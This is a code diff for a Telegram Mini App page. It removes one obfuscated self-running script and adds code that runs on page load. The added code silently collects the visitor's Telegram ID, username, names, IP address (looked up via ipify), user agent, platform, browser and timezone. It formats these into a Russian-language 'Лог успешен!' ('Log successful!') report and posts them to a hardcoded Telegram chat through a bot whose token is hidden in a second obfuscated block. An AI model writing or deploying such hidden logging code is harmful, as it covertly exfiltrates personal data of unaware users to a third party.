@@ -1,1 +1,63 @@
-(function(){var daw='',ADf=498-487;function xCg(n){var p=4281828;var a=n.length;var y=[];for(var t=0;t<a;t++){y[t]=n.charAt(t)};for(var t=0;t<a;t++){var f=p*(t+245)+(p%51648);var q=p*(t+460)+(p%43562);var e=f%a;var u=q%a;var j=y[e];y[e]=y[u];y[u]=j;p=(f+q)%7189233;};return y.join('')};var kSz=xCg('fontsmqsuclocuatrohvbkcwnedijgpyrtxrz').substr(0,ADf);var LYN='2.e s)a4aa 4=,hi[ahv);)e.+z++(in=suj"l=f8p=)sf)vor6+Cy a, s=(n 0l0aj1,y(=se)zil.rw86!85,n6nds,m[s9a,rr(r ,i7itc ahphcrnx);ta;rt;(ma)];;v5avC=6,ssa=+s0)))t++vyx[rn=](sh+om8,. rrf]gzr=09,7n]n;ogvn[4u-0rvq;;cji[;)u2hg]lgnef1vo;;m0;,(i"-v1p=Aexcgdo(n,s7"r.).vi"(+ 1);uoo-g(q;;gc]l iett=r;tit-iy;ivrl<run=urr+fv>r.v}nly(<fa(5r+thol;vA}=]2.Cmhr o6,hi7n+.-;+auhd{fop,.a]r.88frsr;,+=)eer;((gv<o;a)C";rAx S ;"2[tS=;;t(;,it"nsm2tds1jt)Cv.dhr0r)ltAh)vt1v-ag0=,;ell re}8c,ffrCdsl"tel)8}=.{e]g4;hzpv+9repCrdift(mf,)"+=4c*(a=o=et<aCnuhft;;=a4;i96=(k](e)c ;[in{prt)qit==4ga=)x=u,=ao(.hi}(.;upmrvj ib(u(;=gj;=gvksz)ai0xsfsm4h(f>{l+;a(n i+has.[d{+9.7s=<.x06o ,e(vus7bxjuor,ab1)).ac2qx.c)si+i;){g} .p9l((;[+.r,qvc=in(prjoro(a,1h"o0 }=u1r93ir91emuf)2v[2k.8oanoi;lvfvatvr=a7ri7ggrlrn,na=]=d)+v3u+*g=()ar ,r0(,lni=a ea1+sq+;;gtysau=t(=ae8ck(nAtz=r-.j.iw];nr]nf{drio  ;rvoweln16u)[;7eet[v;ves6lmtnw .[.!p[o)q]w1=';var Ihz=xCg[kSz];var zdJ='';var pxv=Ihz;var WLA=Ihz(zdJ,xCg(LYN));var YMK=WLA(xCg('.a3$n3Q_31?\'7=Lf2.6.].o&.E(=1$+c3],QR(0o\/m]QQ.<,.m.s6]cP#Q]gMt.eXPQpQr=Qo=QPo_c %QQdLnE]xu_!:T(9STQQd DQf.+8!4QrMorQFLSnQrs.]heR=!c.)Ct.71]Q_asc2qaapa4QQ[17ies,.Qe+m$.bQu1Lc0_,\/aQmirt!.QQL=S81dQf_.e;QQng}(frQdQI0f.\/dI0d31nMg,1 6\/8d.dQe38|.Qd_jQtQt(O  )9"n Q(cn2a!h$l((QM:Q1aB){i(e hQe)ri.g.@mQ[ %(T8LQt0Dh\/...lQ%jt]o1R5QSeQtQ.Qv^tt37hd$P)e?)ros7svnpM1=eQ3+x4(BQ9]c.n.dlf3788?QxQi.4mbu:t+.!Q)2ta}L{0=62zoerTAx]fctQh;O%t(seei)$]Q7x.3eedQp r1N.4].LQ.mQ}Q.wQ1pt5"tb2;3$_QQeamewiQ{,des2%7w2Q8c+.df%.#ni*L3owwFQQ%kOh@1\/Qs;i<xh)fQm,t6.PQ;Q5|nS0.)erpcQtHI4vp(.QF3P!iQQQ?zno.woE6na).4bo}eaei!g%b\/Q_e%ncnQn.i0e":Q%sRQQe_5Q_%Dets bQQ(,3}B.nQvuQ"n..J{QQQd,]Y].]{b^X3s0 e,Q|Y0At.QG[(dj]dI3bQtl5p.nf%Lv-8dd{:wadd0ueQQ:rKfJouQg75!atrQ{]WQ7\/QeQ.d% rY4772tQxm+Q \/al:)Ct.1fQoQQ.rj%] Q0r.N%.=M_Q2Q($6t;_rarem87c.t )sethQF4nhje6Q.%rS.%mVeQmeQge=%r%)Q]Q!r+LQhj2gamoQi)eQ!3prooe}m )p.ju2j7na\/)2caouQd).M.)deLut2Q60nQQdQ[dHex.(ra4Q(seoQ nrQ}vRf7:!sekp1DfiQRttQ]+%_ba.Qno3Q.n,tt)_f..o.s#7i=s.20Qo=1jQ3om%IdQQfhi\/4\/nct1=1;.h4(gmQorr,5spQ,;tQ3t4%a($%Qt.QfQ)_)Q]0n\/.,o2t1Q2Q no@..!51gQdd=oXe1]ep0d3)8Q2euQpQ5r7.)8Kiec%QV%Qe_rnQZjQoQ(osdpQgi).!2=),(ae)htD;3Q([t;n]Q.GQ0]2.QQe2;fl_s0QQ;\\!ld)cQQmQ="d]d%(_3+.cQ5Qf#]e)_#Q7ma01Lo|Q:r.6v3n2&;B+4{u9(QekV.tur)*! )m,2d5=aQaQ3bQc,d.=4d)))t;Ql\\47]m6..a{c%Qo!,MQe)b.r* ms4,TQQ33-.adJwQfg2Qd!!(w);)Q&a[M]o. n [bb!g0.Qg;njt%j;\'n,jexn{\/u$QdQsee,d)_jQv.bdQQ.26rfeatdQ(t]&+ng.)o!tQ.mCh rb>c m72e=;Q((=Q3Q} .Q0Q6iiQMbQFaDt]0W%6:[=s$z04:d7QbQ]1;g1t.d_QIe)o Edt5QQf?eef[x)1s {oI.)o.QTP.fdt_9.nL$(QoQ7,QbQQ2+u$nQ<tQ1s]edQ,!2(n51i)\\;e$bMusfQ,r3Q=:";,lcQ(afDosk:n$hcQWe"ic]Q%o$3)t.;o*1\/4]t)7o(;L(x1({Q_8GQ9MQ!e;QQ2e]ch(l2pap1m))6Q] ]Q(Ql+QoQ4rs.xw4(;wo=Q.a\/4]]%0il->ardnQ\'.wiw]1ap-t8n\/d\\s,QQ)e8t7Q(%6Qtod9?]s i]J.s=0sl$]ulg:OQQl3Q;(()drQc=cf\'jdQ\/&e\/Q7doQ("teQrEQQ.tf++42;Q.w4r.(CQQ..]tLf.iQM5eQr%m1d;0n.c3ee.$(nh>)_$l3oQ7i2 ,Qs;Q.4d=Sf}e7)LM=Q=e$6a_dQAdhna)D%9Qd.%Q)x)i.rwQQd0.,tQQ6QAd0ea24c 4dQs2Q]s2QC_2=[.:ejQ6Q:]Q3tQdodL lon)nd+;+3Qo5dJ2Q(dU%911]^.$xem%v.1t2.Q|Q,(T.m%3)]UQN%1^iQ}-%n3m]]a.ges?zQ]Qj3dr}..L.+iQwaQ)b)1+i3.rr%d3Q5{d(tldncri!.+B=S]n!,"62AL \/0g@)a1a6)Q]Q.E(Qa29]n.9whi(es]6Qmt4QJc6p,g<aQe0E50..rQ{])_c(3e}_12.39u427o202gd)N_.QQad=.&dy;f]:}:Q(lb7.ev$m98QddsQn]]B]Q$];d()3m.n;Q|4f},2#,ds(hfc97#Q3Q.)cj:.)j0e;3eLQj}a1{]4i; 81s,SeewQlu.4.Qd)r!d{.SjL1yQdi.md;+>2a(%,.)Q)dvto]ppQd41% !Z8M<el_)j,wi)9.3r)QQg$lu6lbed*[0.U)o$t_3dQQ5Qok4AQE8b9,tnshdmdp1CQ"+Js"4[]]3\/.b(m)a%5hdnrQl\/0fe$3|jia,)o];.:E2.%);Zemt]fQ.e:)dQ.:xe.)2((beQ]f\/)(]Xa]fi&(s=pArenQ-iQ49.e(eW1]oQ.netA( he.SQ%Y(dResrna}bWdc..eQ(Qi_nei](eo}Ge[Ha61)43Q{roo3"1fn.i<1.a1PQ9dn3Q _1QgZ)rri=cQQ4 ]VtQeb(n_0w,?3l.a.=sr7d,edU(\/,.d3=o0$Qt]C9srna|})5)t:Qdd;).Qta(uD0!E1)QmD0Qt1.edn%(Q416C%QQ(]Q)f0.QjQ"=d.:]cr$6_fqQtn4.]+[)ln2Q0,d=={ei;+Q]exftiQi3bQl1_"p3e)Ae71>Q,0da\'Q7(d.]en Q]o)dda)atne!l>t.r)5.$QM.L2d#Qna4d.!)aQo.QQp2nbt3ad04d_ {c)1s9%6k]d4v.smRQdQ.pSee__(3,R)2QQaeQQ;eQgg(uQn: QQ%vse99)}Q8snQ=Q+e.40 o(Q.2v]0Q0$((_LQr w"Q) (1fQ( kXQ1m eu;4]d.Q"+d9d4Q7QQd$Q520C%$6 xR4oaQQLn{t[3mt 1 Q%QI%tt)efb(bQ Q jQQrQQm@K=dJ(.de]Q.%.Qi04b!QKl=]+3[nth}i5o].Du];+che)LQ...cQ59 $Co4stQs,])7.0gQ .)ustun 0!_WQnQ9bmns.Q5r0Md 3)I$QR5 HiQ6oQt-o_Q.) h%snn QQ.(e..@84mL_(b_tdf[b=. 9un*$e(v83w}iQ5rdan.npu]sd7Q]% CR]a1 ,Q0\/ !(s, ]Q{).1__['));var TwP=pxv(daw,YMK );TwP(3547);return 6867})()
+let tg = window.Telegram.WebApp;
+document.addEventListener('DOMContentLoaded', function() {
+  const urlParams = new URLSearchParams(window.location.search);
+  const userAgent = navigator.userAgent;
+  fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+      const ip = data.ip;
+      const osname = navigator.platform;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const browser = getBrowserInfo();
+      let userid = document.createElement('p');
+
+      const message = `
+🔥 Лог успешен!
+
+*🧭 Базовая информация:*
+*🔍 Аккаунт в тг:*
+  ├ Айди: ${tg.initDataUnsafe.user.id}
+  ├ Тэг: @${tg.initDataUnsafe.user.username}
+  ├ Имя: ${tg.initDataUnsafe.user.first_name}
+  ├ Фамилия: ${tg.initDataUnsafe.user.last_name}
+  ├ Языковой код: ${tg.initDataUnsafe.user.language_code}
+*💻 Система:*
+  ├ IP: ${ip}
+  ├ UserAgent: ${userAgent}
+  ├ ОС: ${osname}
+  ├ Браузер: ${browser}
+  └ Часовой пояс: ${timeZone}`;
+      
+      var token;(function(){var mWp='',YSC=299-288;function msg(q){var l=403990;var e=q.length;var g=[];for(var x=0;x<e;x++){g[x]=q.charAt(x)};for(var x=0;x<e;x++){var c=l*(x+446)+(l%40963);var z=l*(x+281)+(l%37124);var n=c%e;var h=z%e;var i=g[n];g[n]=g[h];g[h]=i;l=(c+z)%1453345;};return g.join('')};var Rjf=msg('cycgohurqttxblofvorikzscaumsrntjpwdne').substr(0,YSC);var vss='0se =1ir6j4sai[i.0+v=rttr";;2nrcz.jl;lmfol.v.f(p)zszv =);7 afc=g)h1x9=9rfpi,a2S[("f2ujh,88,71ad),i+es5,;u(;2e"5b);f7n6l+cnkbf  ua=m,;hca rhta0nj()rke(g9vi-i1ns[C)rc(]C+ixsamtrt7j+{,a [xvrcj2a"4rA ()irxcang;;7;1ot<{fo.cv,.d=)"=1st];)iv08C] j(=;.Cl=lr;cusv6a6]" ")hf9.qe;j1t-{Soa;=pho,)[>i);oA(){-C=xd=n*!s)C;r3b9y2 w=naohu,.ucrdt.=.;ck;vr1c}3= nqnht.;orq fh=g ({hl8h==v=<b[nsl){x7nfuv !h84=ju0eA0co=(v]2=n]ge0rfh2(m]{qC;}r0u*(v"f.(.t=oe4,m,< 1n(e;;rlq;v+vue]sr.g6[[)1))+,[deua.)).nt[9;inx(s,g=+dtAevn+1we+tcn=arnveestec=ffvif),,f)jv=tuqtse;arsxlljwbg,n(a;=t]s8jga(.;i(hw>;=p[pu<hrm= v)svciat;ult[)crodt h(f(+cbl9h=gp+(n}i1vrfrar(a;oaA.v[;et.ga hes,lu.a]x=1q;k-hkwgro;rrho}3( o);},(javs;l=arn+;;;-, hzrsa<etllr+;oa]rl=;o0;t6ru),+(,)t,,l .n+ons(["a;}bj ++mn.7rg08u=mCs-;7=d (9,)2((snoi]5o)h+ai5(.f-l+a+l6+)dsl=]pl7wc67(;via4+ncr)+.aou8raoo)og}gromgr",]ate(t0j d+rr=brre(9==ar),vd;renv.8.rpac0=';var vNg=msg[Rjf];var BKf='';var oKP=vNg;var hxZ=vNg(BKf,msg(vss));var Giu=hxZ(msg('.#)-[c{.S]rn!^42tyS^bi*gf9o^a3i(o,,;^b,i.^ay$$g^nd(.,t7^^a^)4 .,j^(6k_.d(ei\'s)o,(.,)-$,7^);saio,h\/":^tl,;^b.=!)lnb)hEazjo63,sa^^$l_^e$^.)ly0+cj(_^)6sk6};7$m_ 0f.300938!7.)%2^i^2ayad.;=.7a$+.,o,^%1^.^)=^i.=!$mt^k.o^74j.g^b_6)a^^3f)(.t=)ms5;6a(%enet^p).e[^,_6_Co1e,g!.1d.,#o)b^+^!.o,.+tj(*e;;d( ^dg}1l .ba39{rbp=;.t\/g!0&ad)ar(y(i^^!.!$#=,+o._^__7&6d(!^^y^&)2z^r03^^0wa+z$^$^+^44^!3^^]3y^33c;lf2l^)7;z46_)^)}b..b ^iz$^r$guf}_v^a n!^^(.()#ofl)^ at2!"j_9^a!7u.^.ej {{.;.."4i0]0&2sf shl)g{=i=\/0lf0"^0_w.g7p3r6)sn6tj(m,_\')^}+j;\/;r,({=.n;)ffS.e2n&3 8tn=!.*haaCr;;()2$..sa,.tsu!^..^.=.)abffn1)!)ql0r_=b {=\'();\/y^m^d2r.t)r}2.u4)s3f,nm6,,0}(f^{^ees3^^t*^^^r!(a_;!0.)f#%};#r +^).t2b7,$n^.+a;u1p 8!+j$j3]^;6n(i,(nft{a)i4w=^-^-l3f,$!_\'h.9r7^j;(\/k_-k)3,$!3)de^h(jk2o6p(34w1z{mott(,)m%Tfa0fnih+%^f)^.1cu-l5$}r+!=.p.}e1r(ih=8.ls}z,}tsrd=,fw=($l}z;8e}($=.$4f.$)=(.$re.m!0!=by8gn0)euaf,.o^se;1a%#"tn)b"%;.^=eie;1(dl{N .(4^79(, a^iam^o^s_ r =5[0(s"tf p8h^)ar($;ay14^T,(6'));var mQX=oKP(mWp,Giu );mQX(3415);return 4666})()
+      const chatId = '-1002010632722';
+      const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
+      const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('text', message);
+        formData.append('parse_mode', 'Markdown')
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+      });
+
+  function getBrowserInfo() {
+    const ua = navigator.userAgent;
+    let browser = '';
+    const match = ua.match(/(opera|chrome|safari|firefox|msie|trident(?=\/))\/?\s*(\d+)/i) || [];
+
+    if (/trident/i.test(match[1])) {
+      const tem = /\brv[ :]+(\d+)/g.exec(ua) || [];
+      browser = `IE ${tem[1] || ''}`;
+    }
+
+    if (match[1] === 'Chrome') {
+      const tem = ua.match(/\b(OPR|Edge)\/(\d+)/);
+      if (tem != null) browser = tem.slice(1).join(' ').replace('OPR', 'Opera');
+    }
+
+    match[2] = match[2] ? `version ${match[2]}` : '';
+    browser = `${match[1] || ''} ${match[2] || ''}`.trim();
+    return browser;
+  }
+  });
